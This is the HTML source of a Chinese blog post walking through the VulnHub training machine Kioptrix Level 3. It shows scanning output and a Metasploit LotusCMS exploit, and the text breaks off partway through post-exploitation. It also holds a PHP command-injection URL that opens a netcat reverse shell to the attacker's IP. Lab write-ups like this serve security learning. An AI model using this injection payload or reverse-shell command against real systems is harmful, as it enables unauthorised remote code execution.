@@ -1,0 +1,750 @@
+<!DOCTYPE html>
+<html lang="zh-CN,en,default">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/orange.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/orange.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="HMAT9TapFXG6PRtARF9Qc_fDKANMj-rP3F5FjHjr7kI">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic|EB Garamond:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('https://dana5haw.com').hostname,
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.7.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":"mac"},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    bookmark: {"enable":true,"color":"#222","save":"auto"},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: './public/search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+<script data-ad-client="ca-pub-3938956891324222" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-203752309-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-203752309-1');
+</script>
+  <meta name="description" content="探测靶机同样需要更改虚拟机文件KioptrixVM3.vmx，把ethernet0.connectionType &#x3D; &quot;bridged&quot;改为ethernet0.connectionType &#x3D; &quot;nat&quot;。使用sudo arp-scan -l扫描内网，发现靶机IP是192.168.80.18。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub靶机练习之Kioptix Level 3">
+<meta property="og:url" content="https://dana5haw.com/posts/ZH-CN/Vulnhub_Kioptrix_Three.html">
+<meta property="og:site_name" content="Dana Shaw&#39;s blog">
+<meta property="og:description" content="探测靶机同样需要更改虚拟机文件KioptrixVM3.vmx，把ethernet0.connectionType &#x3D; &quot;bridged&quot;改为ethernet0.connectionType &#x3D; &quot;nat&quot;。使用sudo arp-scan -l扫描内网，发现靶机IP是192.168.80.18。">
+<meta property="og:locale" content="ZH_CN">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8jk1lvhxj313d0llwft.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8kbub7hgj31f60u076p.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8kgxga76j30w70lo3zz.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006gDuOdgy1gc9076ff9lj31a50iwag0.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8qnl3n60j30zv0nlq4v.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8qp7aa24j30zq0mhqdh.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8qqhm573j30zs0niai5.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8qsmwdjlj30zm0mgjss.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8r2j7o7oj30zo0n90x5.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8r5jiwhkj30zn0nj0xa.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8w0jtf53j30zq0ndq7b.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8w3vt54yj31f60u043o.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8w7e1yuxj30zq0ng0x9.jpg">
+<meta property="article:published_time" content="2020-02-25T04:38:46.000Z">
+<meta property="article:modified_time" content="2020-06-27T14:12:28.727Z">
+<meta property="article:author" content="Dana Shaw">
+<meta property="article:tag" content="vulnhub靶机练习">
+<meta property="article:tag" content="Kioptix Level 3">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8jk1lvhxj313d0llwft.jpg">
+
+<link rel="canonical" href="https://dana5haw.com/posts/ZH-CN/Vulnhub_Kioptrix_Three.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>vulnhub靶机练习之Kioptix Level 3 | Dana Shaw's blog</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-203752309-1"></script>
+    <script>
+      var host = window.location.host;
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      if (host.indexOf("127.0.0.1") == -1 && host.indexOf("localhost") == -1) {
+        gtag('js', new Date());
+        gtag('config', 'UA-203752309-1');
+      }
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Dana Shaw's blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Dana Shaw's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">为了去往别处</p>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-fw fa-sitemap"></i>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-commonweal">
+
+    <a href="/404/" rel="section"><i class="fa fa-fw fa-heartbeat"></i>公益 404</a>
+
+  </li>
+        <li class="menu-item menu-item-readnotes">
+
+    <a href="/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" rel="section"><i class="fa fa-fw fa-book"></i>读书笔记</a>
+
+  </li>
+        <li class="menu-item menu-item-movienotes">
+
+    <a href="/categories/%E8%A7%82%E5%BD%B1%E7%AC%94%E8%AE%B0/" rel="section"><i class="fa fa-fw fa-youtube"></i>观影笔记</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="ZH-CN">
+    <link itemprop="mainEntityOfPage" href="https://dana5haw.com/posts/ZH-CN/Vulnhub_Kioptrix_Three.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/./images/photo.jpg">
+      <meta itemprop="name" content="Dana Shaw">
+      <meta itemprop="description" content="连尘埃也想收藏">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dana Shaw's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          vulnhub靶机练习之Kioptix Level 3
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-02-25 12:38:46" itemprop="dateCreated datePublished" datetime="2020-02-25T12:38:46+08:00">2020-02-25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-06-27 22:12:28" itemprop="dateModified" datetime="2020-06-27T22:12:28+08:00">2020-06-27</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">vulnhub靶机练习</span>
+                  </a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>13k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>12 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="探测靶机"><a href="#探测靶机" class="headerlink" title="探测靶机"></a>探测靶机</h2><p>同样需要更改虚拟机文件<code>KioptrixVM3.vmx</code>，把<code>ethernet0.connectionType = &quot;bridged&quot;</code>改为<code>ethernet0.connectionType = &quot;nat&quot;</code>。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8jk1lvhxj313d0llwft.jpg" alt="image.png"><br>使用<code>sudo arp-scan -l</code>扫描内网，发现靶机IP是192.168.80.18。</p>
+<a id="more"></a>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ sudo arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:b2:07:af, IPv4: 192.168.80.14</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.80.1    00:50:56:c0:00:08       VMware, Inc.</span><br><span class="line">192.168.80.2    00:50:56:fc:96:a7       VMware, Inc.</span><br><span class="line">192.168.80.18   00:0c:29:ec:76:c0       VMware, Inc.</span><br><span class="line">192.168.80.17   00:0c:29:fe:3a:82       VMware, Inc.</span><br><span class="line">192.168.80.254  00:50:56:f8:e1:4e       VMware, Inc.</span><br><span class="line"></span><br><span class="line">5 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.077 seconds (123.25 hosts/sec). 5 responded</span><br></pre></td></tr></table></figure>
+<h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p>输入命令<code>sudo nmap -A -T5 -sS 192.168.80.18</code>，扫描结果如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap -A -T5 -sS 192.168.80.18</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-24 23:44 EST</span><br><span class="line">Nmap scan report for 192.168.80.18</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)</span><br><span class="line">|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch</span><br><span class="line">|_http-title: Ligoat Security - Got Goat? Security ...</span><br><span class="line">MAC Address: 00:0C:29:EC:76:C0 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6</span><br><span class="line">OS details: Linux 2.6.9 - 2.6.33</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.12 ms 192.168.80.18</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 14.51 seconds</span><br></pre></td></tr></table></figure>
+<p>我们扫描发现靶机开放了22端口（SSH服务）和80端口（http服务）。</p>
+<h2 id="继续扫描漏洞"><a href="#继续扫描漏洞" class="headerlink" title="继续扫描漏洞"></a>继续扫描漏洞</h2><p>输入<code>nikto -h 192.168.80.18</code>，扫描结果：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ nikto -h 192.168.80.18</span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.80.18</span><br><span class="line">+ Target Hostname:    192.168.80.18</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2020-02-24 23:51:52 (GMT-5)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch</span><br><span class="line">+ Cookie PHPSESSID created without the httponly flag</span><br><span class="line">+ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.6</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span><br><span class="line">+ No CGI Directories found (use '-C all' to force check all possible dirs)</span><br><span class="line">+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</span><br><span class="line">+ PHP/5.2.4-2ubuntu5.6 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.</span><br><span class="line">+ Server may leak inodes via ETags, header found with file /favicon.ico, inode: 631780, size: 23126, mtime: Fri Jun  5 15:22:00 2009</span><br><span class="line">+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.</span><br><span class="line">+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</span><br><span class="line">+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</span><br><span class="line">+ OSVDB-3268: /icons/: Directory indexing found.</span><br><span class="line">+ OSVDB-3233: /icons/README: Apache default file found.</span><br><span class="line">+ /phpmyadmin/: phpMyAdmin directory found</span><br><span class="line">+ OSVDB-3092: /phpmyadmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</span><br><span class="line">+ 7914 requests: 0 error(s) and 19 item(s) reported on remote host</span><br><span class="line">+ End Time:           2020-02-24 23:52:27 (GMT-5) (35 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure>
+<h2 id="设置域名解析"><a href="#设置域名解析" class="headerlink" title="设置域名解析"></a>设置域名解析</h2><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8kbub7hgj31f60u076p.jpg" alt="image.png"></p>
+<h2 id="searchsploit查找网站框架漏洞"><a href="#searchsploit查找网站框架漏洞" class="headerlink" title="searchsploit查找网站框架漏洞"></a>searchsploit查找网站框架漏洞</h2><p>访问网站的登录页面，看到提示信息：此网站基于LotusCMS框架。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8kgxga76j30w70lo3zz.jpg" alt="image.png"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ searchsploit LotusCMS</span><br><span class="line">----------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                   |  Path</span><br><span class="line">                                                                 | (/usr/share/exploitdb/)</span><br><span class="line">----------------------------------------------------------------- ----------------------------------------</span><br><span class="line">LotusCMS 3.0 - 'eval()' Remote Command Execution (Metasploit)    | exploits/php/remote/18565.rb</span><br><span class="line">LotusCMS 3.0.3 - Multiple Vulnerabilities                        | exploits/php/webapps/16982.txt</span><br><span class="line">----------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure>
+<p><a href="https://www.rapid7.com/db/modules/exploit/multi/http/lcms_php_exec" target="_blank" rel="noopener">漏洞相关介绍资料</a></p>
+<h3 id="metasploit漏洞利用过程"><a href="#metasploit漏洞利用过程" class="headerlink" title="metasploit漏洞利用过程"></a>metasploit漏洞利用过程</h3><p>反弹shell方法一（msfconsole）：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/http/lcms_php_exec) &gt; use exploit/multi/http/lcms_php_exec</span><br><span class="line">msf5 exploit(multi/http/lcms_php_exec) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/http/lcms_php_exec):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS   192.168.80.18    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'</span><br><span class="line">   RPORT    80               yes       The target port (TCP)</span><br><span class="line">   SSL      false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   URI      /lcms/           yes       URI</span><br><span class="line">   VHOST                     no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.80.14    yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic LotusCMS 3.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/http/lcms_php_exec) &gt;  set URI / </span><br><span class="line">URI =&gt; /</span><br><span class="line">msf5 exploit(multi/http/lcms_php_exec) &gt;  set RHOST kioptrix3.com</span><br><span class="line">RHOST =&gt; kioptrix3.com</span><br><span class="line">msf5 exploit(multi/http/lcms_php_exec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.80.14:4444 </span><br><span class="line">[*] Using found page param: /index.php?page=index</span><br><span class="line">[*] Sending exploit ...</span><br><span class="line">[*] Sending stage (38288 bytes) to 192.168.80.18</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.80.14:4444 -&gt; 192.168.80.18:33134) at 2020-02-25 08:35:44 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 4855 created.</span><br><span class="line">Channel 0 created.</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>
+<p>反弹shell方法二（使用php注入）：</p>
+<ol>
+<li>攻击机监听5555端口：<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ nc -lnvp 5555</span><br><span class="line">listening on [any] 5555 ...</span><br></pre></td></tr></table></figure></li>
+<li>浏览器中输入payload：<br><a href="https://blog.csdn.net/zuiaituantuan/article/details/5882566" target="_blank" rel="noopener">php的system函数是干嘛的？</a><br><a href="http://kioptrix3.com/index.php?page=index&#39;);${system" target="_blank" rel="noopener">http://kioptrix3.com/index.php?page=index&#39;);${system</a>(‘nc -e /bin/sh 192.168.80.14 5555’)};#<br>注意：这里的192.168.80.14是攻击机的IP。关键是对page这个参数进行命令注入，反弹shell至攻击机。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc9076ff9lj31a50iwag0.jpg" alt="image.png"><br>进入这个shell中查找关键信息，发现这个gconfig.php文件，看看内容是什么：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">head <span class="number">-20</span> gconfig.php <span class="comment">#前20行数据，因为直接cat查看，一屏看不完</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        error_reporting(<span class="number">0</span>);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">                A sample Gallarific configuration file. You should edit</span></span><br><span class="line"><span class="comment">                the installer details below and save this file as gconfig.php</span></span><br><span class="line"><span class="comment">                Do not modify anything else if you don't know what it is.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Installer Details -----------------------------------------------</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Enter the full HTTP path to your Gallarific folder below,</span></span><br><span class="line">        <span class="comment">// such as http://www.yoursite.com/gallery</span></span><br><span class="line">        <span class="comment">// Do NOT include a trailing forward slash</span></span><br><span class="line"></span><br><span class="line">        $GLOBALS[<span class="string">"gallarific_path"</span>] = <span class="string">"http://kioptrix3.com/gallery"</span>;</span><br><span 